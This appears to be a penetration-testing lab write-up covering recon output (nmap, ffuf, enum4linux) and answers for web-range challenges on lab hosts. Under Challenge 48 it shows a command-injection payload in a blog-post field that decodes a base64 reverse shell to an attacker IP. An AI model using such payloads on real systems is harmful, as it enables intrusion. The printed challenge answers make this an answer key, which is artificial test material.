# Web Range - (Completed - 500 Points)

Scope:

IP Address Range: 10.10.1.0/24

Exclusion: 10.10.1.1, 10.10.1.2

Description: In this zone, you will deal with multiple web application vulnerabilities and security misconfigurations. Once you identify them and exploit them, you own the servers. Upon owning them, find the secret keys placed in them.

Note: The target website [syncvibe.xr.com](http://syncvibe.xr.com/) is found to be hosted at the IP address 10.10.1.9.

```jsx
Nmap scan report for 10.10.1.9
Host is up (0.12s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://10.10.1.9/
443/tcp open  ssl/http nginx
|_http-title: Sync VibeXR - Enter the Reality Beyond
| http-robots.txt: 6 disallowed entries 
| /sys/kernel/ /core/ /data/ /player/ /dev-studio/ 
|_/profile/
| ssl-cert: Subject: commonName=syncvibe.xr.io/organizationName=SyncVibe/stateOrProvinceName=London/countryName=GB
| Not valid before: 2026-04-01T11:01:54
|_Not valid after:  2027-04-01T11:01:54
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time

Nmap scan report for 10.10.1.111
Host is up (0.11s latency).
Not shown: 55526 filtered tcp ports (no-response), 10004 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Synixon
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
5000/tcp  open  http        Werkzeug httpd 3.1.3 (Python 3.10.12)
|_http-title: Synixon Gateway (Flask-Jinja2 + WebSocket)
|_http-server-header: Werkzeug/3.1.3 Python/3.10.12
17645/tcp open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Synixon Admin Login

Host script results:
| smb2-time: 
|   date: 2026-08-22T14:31:52
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (3 hosts up) scanned in 489.87 seconds

```

[Web APP 1](Web%20Range%20-%20(Completed%20-%20500%20Points)/Web%20APP%201%20258759b9275182fe997681731684d17b.md)

[Web App 2](Web%20Range%20-%20(Completed%20-%20500%20Points)/Web%20App%202%20df5759b92751820b9bb3811d5636744d.md)

```jsx
┌──(exp10i73r㉿kali)-[~/CPENT]
└─$ ffuf -u http://10.10.1.111/FUZZ -w Common_wordlists.txt -r -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.1.111/FUZZ
 :: Wordlist         : FUZZ: /home/exp10i73r/CPENT/Common_wordlists.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 118ms]
                        [Status: 200, Size: 10410, Words: 3384, Lines: 346, Duration: 109ms]
assets                  [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 106ms]
:: Progress: [243/243] :: Job [1/1] :: 44 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

```jsx
                                                                                                                  
┌──(exp10i73r㉿kali)-[~/CPENT]
└─$ enum4linux -a -u '' -p '' 10.10.1.111
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Aug 22 21:05:45 2026

 =========================================( Target Information )=========================================

Target ........... 10.10.1.111
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.1.111 )============================

[E] Can't find workgroup/domain

 ================================( Nbtstat Information for 10.10.1.111 )================================

Looking up status of 10.10.1.111
No reply from 10.10.1.111

 ====================================( Session Check on 10.10.1.111 )====================================

[+] Server 10.10.1.111 allows sessions using username '', password ''

 =================================( Getting domain SID for 10.10.1.111 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup
                                                                                                                                         
                                                                                                                                         
 ===================================( OS information on 10.10.1.111 )===================================
                                                                                                                                         
                                                                                                                                         
[E] Can't get OS info with smbclient                                                                                                     
                                                                                                                                         
                                                                                                                                         
[+] Got OS info for 10.10.1.111 from srvinfo:                                                                                            
        SYNIXON        Wk Sv PrQ Unx NT SNT synixon server (Samba, Ubuntu)                                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ========================================( Users on 10.10.1.111 )========================================
                                                                                                                                         
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: steve    Name:   Desc:                                                                    

user:[steve] rid:[0x3e8]

 ==================================( Share Enumeration on 10.10.1.111 )==================================
                                                                                                                                         
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                    

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (synixon server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 10.10.1.111 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.1.111                                                                                              
                                                                                                                                         
//10.10.1.111/print$    Mapping: DENIED Listing: N/A Writing: N/A                                                                        
//10.10.1.111/sambashare        Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                           
                                                                                                                                         
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                               
//10.10.1.111/IPC$      Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.1.111 )============================
                                                                                                                                         
Password:                                                                                                                                

[+] Attaching to 10.10.1.111 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SYNIXON
        [+] Builtin

[+] Password Info for Domain: SYNIXON

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:                                                                                     
                                                                                                                                         
                                                                                                                                         
Password Complexity: Disabled                                                                                                            
Minimum Password Length: 5

 =======================================( Groups on 10.10.1.111 )=======================================
                                                                                                                                         
                                                                                                                                         
[+] Getting builtin groups:                                                                                                              
                                                                                                                                         
                                                                                                                                         
[+]  Getting builtin group memberships:                                                                                                  
                                                                                                                                         
                                                                                                                                         
[+]  Getting local groups:                                                                                                               
                                                                                                                                         
                                                                                                                                         
[+]  Getting local group memberships:                                                                                                    
                                                                                                                                         
                                                                                                                                         
[+]  Getting domain groups:                                                                                                              
                                                                                                                                         
                                                                                                                                         
[+]  Getting domain group memberships:                                                                                                   
                                                                                                                                         
                                                                                                                                         
 ===================( Users on 10.10.1.111 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                         
                                                                                                                                         
[I] Found new SID:                                                                                                                       
S-1-22-1                                                                                                                                 

[I] Found new SID:                                                                                                                       
S-1-5-32                                                                                                                                 

[I] Found new SID:                                                                                                                       
S-1-5-32                                                                                                                                 

[I] Found new SID:                                                                                                                       
S-1-5-32                                                                                                                                 

[I] Found new SID:                                                                                                                       
S-1-5-32                                                                                                                                 

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                              
                                                                                                                                         
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                        
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                              
                                                                                                                                         
S-1-22-1-1000 Unix User\ctfroot (Local User)                                                                                             

[+] Enumerating users using SID S-1-5-21-3256709002-3609780400-575883822 and logon username '', password ''                              
                                                                                                                                         
S-1-5-21-3256709002-3609780400-575883822-501 SYNIXON\nobody (Local User)                                                                 
S-1-5-21-3256709002-3609780400-575883822-513 SYNIXON\None (Domain Group)
S-1-5-21-3256709002-3609780400-575883822-1000 SYNIXON\steve (Local User)

 ================================( Getting printer info for 10.10.1.111 )================================
                                                                                                                                         
No printers returned.                                                                                                                    

enum4linux complete on Sat Aug 22 21:14:48 2026
```

## Fuzzing Directories

```jsx
──(exp10i73r㉿kali)-[~/CPENT]
└─$ ffuf -u https://10.10.1.9/FUZZ -w Common_wordlists.txt -r -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.1.9/FUZZ
 :: Wordlist         : FUZZ: /home/exp10i73r/CPENT/Common_wordlists.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

blogs                   [Status: 200, Size: 10348, Words: 531, Lines: 10, Duration: 222ms]
games                   [Status: 200, Size: 10108, Words: 528, Lines: 10, Duration: 215ms]
data                    [Status: 401, Size: 10829, Words: 601, Lines: 10, Duration: 263ms]
network                 [Status: 401, Size: 10829, Words: 601, Lines: 10, Duration: 167ms]
profile                 [Status: 401, Size: 10829, Words: 601, Lines: 10, Duration: 161ms]
contact                 [Status: 200, Size: 12565, Words: 704, Lines: 10, Duration: 371ms]
register                [Status: 200, Size: 12837, Words: 716, Lines: 10, Duration: 197ms]
sys                     [Status: 401, Size: 10829, Words: 601, Lines: 10, Duration: 152ms]
search                  [Status: 200, Size: 10230, Words: 530, Lines: 10, Duration: 209ms]
core                    [Status: 401, Size: 10829, Words: 601, Lines: 10, Duration: 441ms]
login                   [Status: 200, Size: 10159, Words: 525, Lines: 10, Duration: 332ms]
                        [Status: 200, Size: 19356, Words: 1145, Lines: 10, Duration: 153ms]
temp-objects            [Status: 401, Size: 10829, Words: 601, Lines: 10, Duration: 174ms]
search                  [Status: 200, Size: 10230, Words: 530, Lines: 10, Duration: 125ms]
search                  [Status: 200, Size: 10230, Words: 530, Lines: 10, Duration: 130ms]
profile                 [Status: 401, Size: 10829, Words: 601, Lines: 10, Duration: 221ms]
:: Progress: [243/243] :: Job [1/1] :: 308 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

### Challenge 48: (100 Points) Identify Maria's Region from the TKT-TKT-004_Emergency_Staging.md file located on the [syncvibe.xr.com](http://syncvibe.xr.com/) web server and submit it as your response. (Answer Format: Xxxxx XxxXx)

```bash
Spain LatAm
```

![Screenshot 2026-09-03 at 23-04-22.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-04-22.png)

![Screenshot 2026-09-03 at 23-06-14.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-06-14.png)

![Screenshot 2026-09-03 at 23-08-29.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-08-29.png)

![Screenshot 2026-09-03 at 23-09-39.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-09-39.png)

![Screenshot 2026-09-03 at 23-11-05.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-11-05.png)

```bash
{
  "blogId":"6a9998cd7943a39aec5be9d0",
  "author":"root",
  "text":"|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjcuMjMyLjMvNDQ0NCAwPiYx | base64 -d | bash||a #' |echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjcuMjMyLjMvNDQ0NCAwPiYx | base64 -d | bash||a #|"
}		
```

![Screenshot 2026-09-03 at 23-11-27.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-11-27.png)

![Screenshot 2026-09-03 at 23-17-23.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-17-23.png)

![Screenshot 2026-09-03 at 23-41-45.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-41-45.png)

![Screenshot 2026-09-03 at 23-44-54.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-44-54.png)

![Screenshot 2026-09-03 at 23-46-13.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-46-13.png)

![Screenshot 2026-09-03 at 23-48-20.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_23-48-20.png)

![Screenshot 2026-09-04 at 00-02-57.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-02-57.png)

![Screenshot 2026-09-04 at 00-05-07.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-05-07.png)

![Screenshot 2026-09-04 at 00-04-27.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-04-27.png)

![Screenshot 2026-09-04 at 00-00-39.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-00-39.png)

### Challenge 49: (100 Points) Identify the security passphrase associated with user kwame from the SSH key backups stored on the [syncvibe.xr.com](http://syncvibe.xr.com/) web server and determine the last 5 characters as your answer. (Answer Format: NxXxx)

```bash
1sHer
```

![Screenshot 2026-09-04 at 00-15-21.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-15-21.png)

![Screenshot 2026-09-04 at 00-17-14.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-17-14.png)

### Challenge 50: (100 Points) Identify the incident_rep_master.zip file on the [syncvibe.xr.com](http://syncvibe.xr.com/) web server, extract its contents and determine the first five characters of MASTER EMERGENCY SYSTEM OVERRIDE KEY as your response. (use the hint provided in Hint.txt on the server) (Answer Format: XNxXN)

```bash
N4tV8
```

![Screenshot 2026-09-04 at 00-19-01.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-19-01.png)

![Screenshot 2026-09-04 at 00-20-48.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-20-48.png)

![Screenshot 2026-09-04 at 00-21-17.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-04_at_00-21-17.png)

### Challenge 51: (50 Points) Find the supervisor's email ID on the website running on the machine with the IP address 10.10.1.111. (Answer Format: [xxxx@xxxxxxx.xxx](mailto:xxxx@xxxxxxx.xxx))

```jsx
tony@synixon.com
```

![Screenshot 2026-09-03 at 15-39-45.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_15-39-45.png)

![Screenshot 2026-09-03 at 15-41-45.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_15-41-45.png)

![Screenshot 2026-09-03 at 15-45-56.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_15-45-56.png)

### Challenge 52: (50 Points) Determine the filename of the legacy keyset log file on the target machine with the IP address 10.10.1.111. (Answer Format: xxxxxx_xxx_xxxx.xxx)

```jsx
legacy_dev_keys.log
```

![Screenshot 2026-09-03 at 15-50-25.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_15-50-25.png)

![Screenshot 2026-09-03 at 15-52-02.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_15-52-02.png)

![Screenshot 2026-09-03 at 16-08-59.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_16-08-59.png)

![Screenshot 2026-09-03 at 15-58-12.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_15-58-12.png)

![Screenshot 2026-09-03 at 16-09-50.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_16-09-50.png)

![Screenshot 2026-09-03 at 16-10-35.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_16-10-35.png)

### Challenge 53: (100 Points) Identify the contents inside the brackets of flag.txt file on the target machine with the IP address 10.10.1.111 and submit it as the answer. (Answer Format: XNXXNXNX )

```jsx
A1EL2L8P
```

![Screenshot 2026-09-03 at 15-58-12.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_15-58-12.png)

![Screenshot 2026-09-03 at 16-16-11.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_16-16-11.png)

![Screenshot 2026-09-03 at 16-17-22.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_16-17-22.png)

![Screenshot 2026-09-03 at 16-18-31.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_16-18-31.png)

![Screenshot 2026-09-03 at 16-19-01.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_16-19-01.png)

![Screenshot 2026-09-03 at 16-19-30.png](Web%20Range%20-%20(Completed%20-%20500%20Points)/Screenshot_2026-09-03_at_16-19-30.png)